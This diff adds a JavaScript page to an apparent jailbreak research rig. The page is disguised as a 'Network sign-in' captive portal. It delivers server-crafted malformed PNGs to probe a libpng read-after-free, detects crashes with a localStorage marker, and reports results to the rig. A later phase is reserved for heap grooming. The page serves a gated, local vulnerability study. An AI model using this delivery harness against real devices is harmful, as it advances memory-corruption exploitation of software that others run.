@@ -1,0 +1,521 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Network sign-in</title>
+<style>
+  /* Self-contained: no external assets ever leave this page (the PNG
+     probes come from the rig's own /rig/png/ztxt crafter). Same dark
+     card as the other rig pages. */
+  html, body { margin: 0; padding: 0; background: #101318; color: #e8eaf0;
+               font-family: sans-serif; }
+  #rig-card { max-width: 900px; margin: 24px auto; padding: 20px 24px;
+              background: #1a1f2b; border: 1px solid #2c3446; border-radius: 10px; }
+  #rig-card h1 { font-size: 24px; margin: 0 0 4px 0; }
+  #rig-card h2 { font-size: 14px; font-weight: normal; color: #8f9ab3;
+                 margin: 0 0 16px 0; }
+  #rig-state { display: inline-block; padding: 2px 10px; border-radius: 6px;
+               font-size: 14px; background: #3a4460; }
+  #rig-state.done { background: #2e6b3a; }
+  #rig-state.hit { background: #7a2e35; }
+  #rig-state.failed { background: #7a2e35; }
+  table { width: 100%; border-collapse: collapse; font-size: 17px; }
+  td { padding: 5px 6px; border-bottom: 1px solid #262d3d; vertical-align: top; }
+  td.k { color: #9fb0d8; white-space: nowrap; width: 40%; }
+  td.v { word-break: break-all; font-family: monospace; font-size: 15px; }
+  .note { color: #8f9ab3; font-size: 13px; margin-top: 14px; }
+</style>
+</head>
+<body>
+<div id="rig-card">
+  <h1>Network sign-in</h1>
+  <h2>libpng compressed-ancillary-chunk oracle &mdash; BarbarismJB
+      webkit-rig pngztxt (CVE-2026-46675 class, phased; SAFE parse-success
+      oracle by default)</h2>
+  <div id="rig-state">BOOT</div>
+  <table id="rig-rows">
+    <tr><td class="k">user agent</td><td class="v" id="rig-ua">probing&hellip;</td></tr>
+    <tr><td class="k">page url</td><td class="v" id="rig-url">&nbsp;</td></tr>
+    <tr><td class="k">phase gate</td><td class="v" id="rig-gate">asking rig&hellip;</td></tr>
+    <tr><td class="k">phase 1 &mdash; benign chunks</td><td class="v" id="rig-p1">pending</td></tr>
+    <tr><td class="k">phase 2 &mdash; malformed chunks</td><td class="v" id="rig-p2">pending</td></tr>
+    <tr><td class="k">phase 3 &mdash; victim shaping</td><td class="v" id="rig-p3">pending</td></tr>
+    <tr><td class="k">verdict</td><td class="v" id="rig-verdict">pending</td></tr>
+    <tr><td class="k">telemetry</td><td class="v" id="rig-post">pending</td></tr>
+  </table>
+  <div class="note">Phase 1 loads only well-formed zTXt/iCCP/iTXt PNGs
+      from the rig's own crafter &mdash; it proves the compressed-chunk
+      path executes, nothing more. Phase 2 (malformed shapes, the actual
+      46675 attack surface) runs ONLY after the bench operator advances
+      the rig-side gate: <tt>curl -X POST http://RIG/rig/phase -d
+      '{"phase":2}'</tt> (local only; the crafter refuses malformed modes
+      below it too). A crash mid-run leaves an "armed" marker reported on
+      the next load. Page marker pngztxt (see docs/RIG.md).</div>
+</div>
+<noscript><div style="color:#e8eaf0;padding:20px">
+  JavaScript did not run: the applet blocked scripting or the page did not
+  load. Record this -- it is a negative result for the oracle.</div></noscript>
+<script>
+/* BarbarismJB webkit-rig pngztxt page: libpng compressed-ancillary-chunk
+ * oracle (CVE-2026-46675 class).
+ *
+ * PROVENANCE -- the bug class as verified in the fw-23.0.1 dump
+ * (docs/NDAYS-C-TIER.md verdict 1): the applet ships libpng 1.6.57
+ * (wkc0/wkc1 strings), the CVE-2026-46675 read-after-free in the
+ * compressed ancillary-chunk handling (zTXt/iCCP/iTXt) is fixed only in
+ * 1.6.59 (2026-09-30) -- the trigger is one crafted PNG through <img>,
+ * with the EOF handler reading the zlib stream pointer after free.
+ * Reachability from the portal page is HIGH (<img>, no other state).
+ *
+ * Delivery: this page loads <img> elements pointing at the rig's own
+ * /rig/png/ztxt?mode=N&seed=N crafter (portal.py, stdlib zlib). Canvas is
+ * NOT used to build probes -- it re-encodes and would destroy the chunk
+ * framing; every probe byte is crafted server-side.
+ *
+ * PHASES (config constants in CFG):
+ *   1 (default, SAFE): parse-success oracle. Modes 0-3 (baseline,
+ *     well-formed zTXt, well-formed iCCP, well-formed iTXt): load/error
+ *     events, naturalWidth/Height, decode() timing. Proves the
+ *     compressed-chunk code path executes WITHOUT attacking it.
+ *   2 (rig gate >= 2): escalating malformed shapes -- modes 10-16
+ *     (truncated zlib streams, chunk length past EOF, ~1MiB iCCP
+ *     profile, empty compressed data, bad CRC), REPEATS per mode with
+ *     distinct seeds. Armed-marker before each mode; crash = no further
+ *     telemetry + marker reported on the next load (crash-suffix oracle
+ *     like fontchain). The crafter ALSO gates malformed modes server-side
+ *     (403 below phase 2), so the shapes cannot be fetched by accident.
+ *   3 (rig gate >= 3): reserved stub (victim shaping -- heap grooming
+ *     around the freed zlib stream via interleaved allocations between
+ *     decode() calls; not built until phase 2 maps crash behavior).
+ *
+ * The gate: GET /rig/phase; ?phase=N can only LOWER the effective phase.
+ *
+ * Every image reports {mode, seed, outcome, naturalW/H, decodeMs,
+ * exception}. ES5-only like the other rig pages. The server templates
+ * {{RIG_HOST}}/{{RIG_PORT}}; unfilled tokens fall back to location.host.
+ */
+
+var RIG_SCHEMA = 1;
+var RIG_PAGE = "pngztxt";
+var RIG_HOST = "{{RIG_HOST}}";
+var RIG_PORT = "{{RIG_PORT}}";
+var RIG_FILLED = RIG_HOST.indexOf("{{") !== 0;
+var RIG_BASE = RIG_FILLED
+    ? "http://" + RIG_HOST + ":" + RIG_PORT
+    : (location.protocol + "//" + location.host);
+
+/* ------------------------------------------------- config constants */
+var CFG = {
+  /* mode ids mirror portal.py's PNG_MODE_NAMES */
+  MODES_BENIGN: [0, 1, 2, 3],
+  MODES_MALFORMED: [10, 11, 12, 13, 14, 15, 16],
+  P1_REPEATS: 2,                    /* loads per benign mode            */
+  P2_REPEATS: 3,                    /* loads per malformed mode         */
+  IMG_TIMEOUT_MS: 8000,             /* per-image watchdog               */
+  SETTLE_MS: 60                     /* gap between images               */
+};
+
+var R = {
+  schema: RIG_SCHEMA,
+  page: "pngztxt",
+  phase: "boot",
+  seq: 0,
+  startedAt: (new Date()).toISOString(),
+  stage: "boot",
+  rig: { templated: RIG_FILLED ? (RIG_HOST + ":" + RIG_PORT) : null,
+         base: RIG_BASE, pageHost: location.host },
+  location: { url: location.href, referrer: document.referrer || null },
+  env: { userAgent: navigator.userAgent },
+  gate: { rigPhase: null, requestedPhase: null, effectivePhase: null,
+          priorCrash: false },
+  p1: { images: [], verdict: null },
+  p2: { rounds: [], verdict: null },
+  p3: null,
+  verdict: null,
+  cfg: { benignModes: CFG.MODES_BENIGN.slice(),
+         malformedModes: CFG.MODES_MALFORMED.slice(),
+         p1Repeats: CFG.P1_REPEATS, p2Repeats: CFG.P2_REPEATS,
+         imgTimeoutMs: CFG.IMG_TIMEOUT_MS },
+  errors: []
+};
+
+function fail(stage, e) {
+  if (R.errors.length < 20) {
+    R.errors.push({ stage: stage, error: String(e && e.message ? e.message : e) });
+  }
+}
+function $(id) { return document.getElementById(id); }
+function setRow(id, text) { try { $(id).textContent = String(text); } catch (e) {} }
+function setState(text, cls) {
+  try { var el = $("rig-state"); el.textContent = text;
+        el.className = cls || ""; } catch (e) {}
+}
+function nowMs() {
+  try {
+    if (typeof performance !== "undefined" && performance &&
+        typeof performance.now === "function") {
+      return performance.now();
+    }
+  } catch (e) {}
+  return Date.now();
+}
+function r3(x) { return Math.round(x * 1000) / 1000; }
+function probe(stage, fn) {
+  try { return fn(); } catch (e) { fail(stage, e); return null; }
+}
+
+/* ------------------------------------------------------- transport */
+function sendJson(url, obj, cb) {
+  var payload;
+  try { payload = JSON.stringify(obj); }
+  catch (e) { fail("post.stringify", e); cb(false); return; }
+  if (typeof fetch === "function") {
+    fetch(url, { method: "POST",
+                 headers: { "Content-Type": "application/json" },
+                 body: payload })
+      .then(function (res) { cb(!!res && res.ok); })
+      .catch(function () { viaXhr(url, payload, cb); });
+    return;
+  }
+  viaXhr(url, payload, cb);
+}
+function viaXhr(url, payload, cb) {
+  if (typeof XMLHttpRequest === "undefined") { cb(false); return; }
+  var done = false;
+  function finish(ok) { if (!done) { done = true; cb(ok); } }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", url, true);
+    xhr.timeout = 5000;
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) { finish(xhr.status >= 200 && xhr.status < 300); }
+    };
+    xhr.onerror = function () { finish(false); };
+    xhr.ontimeout = function () { finish(false); };
+    xhr.send(payload);
+  } catch (e) { fail("post.xhr", e); finish(false); }
+}
+var BACKOFF_MS = [250, 500, 1000, 2000, 4000, 8000];
+function postReport(phase, cb) {
+  var attempts = 0;
+  function attempt() {
+    attempts++;
+    R.phase = phase;
+    R.seq++;
+    sendJson(RIG_BASE + "/report", R, function (ok) {
+      if (ok) { cb(true, attempts); return; }
+      if (attempts <= BACKOFF_MS.length) {
+        setRow("rig-post", "retry " + attempts + " in " + BACKOFF_MS[attempts - 1] + "ms");
+        setTimeout(attempt, BACKOFF_MS[attempts - 1]);
+      } else { cb(false, attempts); }
+    });
+  }
+  attempt();
+}
+function getJson(url, cb, timeoutMs) {
+  var settled = false;
+  var to = setTimeout(function () {
+    if (!settled) { settled = true; cb(null, "timeout"); }
+  }, timeoutMs || 4000);
+  if (typeof fetch === "function") {
+    fetch(url)
+      .then(function (res) { return res.json(); })
+      .then(function (j) {
+        if (!settled) { settled = true; clearTimeout(to); cb(j, null); }
+      })
+      .catch(function (e) {
+        if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); }
+      });
+    return;
+  }
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", url, true);
+    xhr.timeout = timeoutMs || 4000;
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && !settled) {
+        settled = true; clearTimeout(to);
+        if (xhr.status >= 200 && xhr.status < 300) {
+          try { cb(JSON.parse(xhr.responseText), null); }
+          catch (e) { cb(null, "bad json"); }
+        } else { cb(null, "HTTP " + xhr.status); }
+      }
+    };
+    xhr.onerror = function () {
+      if (!settled) { settled = true; clearTimeout(to); cb(null, "xhr.error"); }
+    };
+    xhr.send();
+  } catch (e) { if (!settled) { settled = true; clearTimeout(to); cb(null, String(e)); } }
+}
+
+/* ------------------------------------------------- crash-oracle marker */
+var MARKER_KEY = "pngztxt:last-run";
+function armMarker(tag) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "armed", tag: tag,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function disarmMarker(tag, verdict) {
+  try {
+    localStorage.setItem(MARKER_KEY, JSON.stringify({ state: "done", tag: tag,
+                                                     verdict: verdict,
+                                                     ts: (new Date()).toISOString() }));
+  } catch (e) {}
+}
+function checkPriorCrash() {
+  try {
+    var raw = localStorage.getItem(MARKER_KEY);
+    if (!raw) { return null; }
+    var m = JSON.parse(raw);
+    return m && m.state === "armed" ? m : null;
+  } catch (e) { return null; }
+}
+
+/* -------------------------------------------------- image loader */
+/* One <img> load from the crafter, fully instrumented. NEVER throws:
+ * onload/onerror/watchdog all funnel into cb with a full record. */
+function loadProbeImage(mode, seed, cb) {
+  var rec = { mode: mode, seed: seed,
+              url: RIG_BASE + "/rig/png/ztxt?mode=" + mode + "&seed=" + seed };
+  var settled = false;
+  var t0 = nowMs();
+  var toTimer = null;
+  var img = new Image();
+  function done() {
+    if (settled) { return; }
+    settled = true;
+    if (toTimer) { clearTimeout(toTimer); toTimer = null; }
+    rec.totalMs = r3(nowMs() - t0);
+    try { img.onload = img.onerror = null; } catch (e) {}
+    cb(rec);
+  }
+  img.onload = function () {
+    rec.outcome = "load";
+    rec.naturalW = img.naturalWidth;
+    rec.naturalH = img.naturalHeight;
+    if (img.decode && typeof img.decode === "function") {
+      var td = nowMs();
+      img.decode().then(function () {
+        rec.decodeMs = r3(nowMs() - td);
+        rec.decodeOk = true;
+        done();
+      }, function (e) {
+        rec.decodeMs = r3(nowMs() - td);
+        rec.decodeOk = false;
+        rec.decodeError = String(e && e.message ? e.message : e).slice(0, 160);
+        done();
+      });
+      return;
+    }
+    done();
+  };
+  img.onerror = function () {
+    /* no diagnostic text is available from <img> errors; the access log
+     * on the bench carries the request-side view */
+    rec.outcome = "error";
+    done();
+  };
+  toTimer = setTimeout(function () {
+    rec.outcome = "timeout";
+    done();
+  }, CFG.IMG_TIMEOUT_MS);
+  img.src = rec.url;
+}
+
+/* ------------------------------------------------------ phase 1 */
+function phase1(cb) {
+  var queue = [];
+  var i, j;
+  for (i = 0; i < CFG.MODES_BENIGN.length; i++) {
+    for (j = 0; j < CFG.P1_REPEATS; j++) {
+      queue.push({ mode: CFG.MODES_BENIGN[i], seed: 100 + j });
+    }
+  }
+  var results = [];
+  function next() {
+    if (!queue.length) {
+      R.p1.images = results;
+      /* verdict: did every well-formed compressed-chunk variant load? */
+      var loaded = 0, errors = 0, timeouts = 0, i2;
+      for (i2 = 0; i2 < results.length; i2++) {
+        if (results[i2].outcome === "load") { loaded++; }
+        else if (results[i2].outcome === "error") { errors++; }
+        else { timeouts++; }
+      }
+      R.p1.verdict = (loaded === results.length) ? "PARSE-PATH-LIVE"
+          : (errors ? "CHUNK-REJECTED(" + errors + ")" : "TIMEOUTS");
+      setRow("rig-p1", R.p1.verdict + " (" + loaded + "/" +
+             results.length + " loads)");
+      cb(R.p1.verdict === "PARSE-PATH-LIVE");
+      return;
+    }
+    var q = queue.shift();
+    loadProbeImage(q.mode, q.seed, function (rec) {
+      results.push(rec);
+      setRow("rig-p1", "mode " + q.mode + " seed " + q.seed + ": " +
+             rec.outcome + (rec.decodeMs != null ? " decode " + rec.decodeMs + "ms" : ""));
+      setTimeout(next, CFG.SETTLE_MS);
+    });
+  }
+  next();
+}
+
+/* ------------------------------------------------------ phase 2 */
+function phase2(cb) {
+  var rounds = [];
+  var rIdx = 0;
+  function nextMode() {
+    if (rIdx >= CFG.MODES_MALFORMED.length) {
+      var surv = 0, errs = 0, timeouts = 0, crashed = false, i, j;
+      for (i = 0; i < rounds.length; i++) {
+        for (j = 0; j < rounds[i].images.length; j++) {
+          var o = rounds[i].images[j].outcome;
+          if (o === "load") { surv++; }
+          else if (o === "error") { errs++; }
+          else if (o === "timeout") { timeouts++; }
+        }
+      }
+      R.p2.rounds = rounds;
+      R.p2.verdict = "MALFORMED-SURVIVED";
+      setRow("rig-p2", R.p2.verdict + " (" + surv + "L/" + errs + "E/" +
+             timeouts + "T)");
+      disarmMarker("p2", R.p2.verdict);
+      cb(false);
+      return;
+    }
+    var mode = CFG.MODES_MALFORMED[rIdx];
+    var tag = "p2:mode" + mode;
+    armMarker(tag);
+    var round = { mode: mode, images: [] };
+    var rep = 0;
+    function nextRep() {
+      if (rep >= CFG.P2_REPEATS) {
+        rounds.push(round);
+        rIdx++;
+        /* mid-phase telemetry: a crash on a later mode still leaves the
+         * earlier rounds on the bench */
+        postReport("progress", function () {});
+        setRow("rig-p2", "mode " + mode + " done (" + (rIdx) + "/" +
+               CFG.MODES_MALFORMED.length + ")");
+        setTimeout(nextMode, CFG.SETTLE_MS);
+        return;
+      }
+      loadProbeImage(mode, 200 + rep, function (rec) {
+        round.images.push(rec);
+        rep++;
+        setRow("rig-p2", "mode " + mode + " rep " + rep + ": " + rec.outcome +
+               " " + rec.totalMs + "ms");
+        setTimeout(nextRep, CFG.SETTLE_MS);
+      });
+    }
+    nextRep();
+  }
+  nextMode();
+}
+
+/* ------------------------------------------------------ phase 3 */
+function phase3(cb) {
+  R.p3 = { attempted: true, verdict: "RESERVED",
+           note: "victim shaping (heap grooming around the freed zlib " +
+                 "stream) built only after phase 2 maps crash behavior" };
+  setRow("rig-p3", "reserved (gate is on; shaping not yet built)");
+  disarmMarker("p3", "RESERVED");
+  cb();
+}
+
+/* ------------------------------------------------------------ verdict */
+function computeVerdict() {
+  if (R.gate.priorCrash) { return "PRIOR-RUN-CRASHED"; }
+  if (R.p2.verdict) { return R.p2.verdict; }
+  return R.p1.verdict || "UNKNOWN";
+}
+
+/* ------------------------------------------------------------ driver */
+function gateRow() {
+  return "rig=" + (R.gate.rigPhase == null ? "?" : R.gate.rigPhase) +
+         " want=" + (R.gate.requestedPhase == null ? "?" : R.gate.requestedPhase) +
+         " effective=" + R.gate.effectivePhase;
+}
+function run() {
+  setRow("rig-url", location.href);
+  setRow("rig-ua", navigator.userAgent || "(no navigator.userAgent)");
+
+  var prior = checkPriorCrash();
+  if (prior) {
+    R.gate.priorCrash = true;
+    R.gate.priorCrashMarker = prior;
+    setRow("rig-verdict", "PRIOR RUN LEFT ARMED MARKER (crash oracle: " +
+           (prior.tag || "?") + " at " + (prior.ts || "?") + ")");
+  }
+
+  var want = 1;
+  try {
+    var mWant = location.search.match(/[?&]phase=(\d+)/);
+    if (mWant) { want = Math.max(1, Math.min(3, parseInt(mWant[1], 10))); }
+  } catch (e) {}
+  R.gate.requestedPhase = want;
+  getJson(RIG_BASE + "/rig/phase", function (j, err) {
+    if (j && typeof j.phase === "number") {
+      R.gate.rigPhase = j.phase;
+    } else {
+      R.gate.rigPhase = 1;                    /* unreachable gate == safe */
+      R.gate.gateError = err || "unparsable";
+    }
+    R.gate.effectivePhase = Math.min(R.gate.rigPhase, want);
+    setRow("rig-gate", gateRow());
+
+    postReport("env", function (ok, att) {
+      setRow("rig-post", ok ? "sent (env, " + att + " attempt(s))"
+                            : "env POST failed after " + att);
+    });
+
+    phase1(function () {
+      if (R.gate.effectivePhase < 2) { return finish(); }
+      phase2(function () {
+        if (R.gate.effectivePhase < 3) { return finish(); }
+        phase3(function () { finish(); });
+      });
+    });
+  });
+
+  /* watchdog: whatever wedges, the page must still POST a partial result */
+  setTimeout(function () {
+    if (R.stage === "done") { return; }
+    fail("watchdog", "budget exceeded in stage " + R.stage);
+    finish();
+  }, 30000);
+
+  function finish() {
+    if (R.stage === "done") { return; }
+    R.stage = "done";
+    R.verdict = computeVerdict();
+    setRow("rig-verdict", R.verdict);
+    setState(R.verdict.indexOf("CRASHED") !== -1 ? "HIT" : "DONE",
+             R.verdict.indexOf("CRASHED") !== -1 ? "hit" : "done");
+    postReport("verdict", function (ok, att) {
+      setRow("rig-post", ok ? "sent (verdict, " + att + " attempt(s))"
+                            : "FAILED after " + att + " attempts");
+    });
+  }
+}
+
+/* expose for wsagent-driven repetition */
+window.__pngztxt = window.__pngztxt || {};
+window.__pngztxt.cfg = CFG;
+window.__pngztxt.loadProbeImage = loadProbeImage;
+
+try {
+  run();
+} catch (e) {
+  fail("driver", e);
+  R.stage = "CRASHED@" + (R.stage || "driver");
+  setState("ORACLE CRASHED", "failed");
+  setRow("rig-verdict", R.stage);
+  try { postReport("crash", function () {}); } catch (e2) {}
+}
+</script>
+</body>
+</html>
